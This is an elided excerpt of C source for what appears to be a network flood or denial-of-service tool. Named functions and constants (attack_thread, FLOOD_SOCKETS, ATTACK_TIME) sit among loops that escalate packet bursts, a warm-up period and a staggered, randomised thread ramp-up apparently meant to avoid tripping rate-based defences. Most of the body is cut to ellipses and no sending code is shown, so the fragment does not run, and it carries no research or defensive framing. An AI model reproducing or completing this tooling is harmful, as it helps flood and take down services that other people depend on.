    ...
    while (!atomic_load(&stop_signal)) {
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            if (sent_this_burst == adaptive_burst) {
                if (adaptive_burst < MAX_BURST_SIZE) adaptive_burst += 2;
            }
...
void *attack_thread(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (sent_this_burst == adaptive_burst) {
            if (adaptive_burst < MAX_BURST_SIZE) adaptive_burst += 1;
        }
...
int main(int argc, char *argv[]) {
    ...
    for (int warm = 0; warm < WARMUP_SECONDS; warm++) {
    ...
    if (THREAD_COUNT > GRADUAL_THREADS) {
        threads_to_start = GRADUAL_THREADS;
    } else {
        threads_to_start = THREAD_COUNT / 2;
    ...
    for (int i = 0; i < threads_to_start; i++) {
        ...
        usleep(5000 + (rand() % 15000));
    }
    
    int remaining_threads = THREAD_COUNT - threads_to_start;
    if (remaining_threads > 0) {
        int delay_ms = (ATTACK_TIME > 120) ? 2000 : 1000;
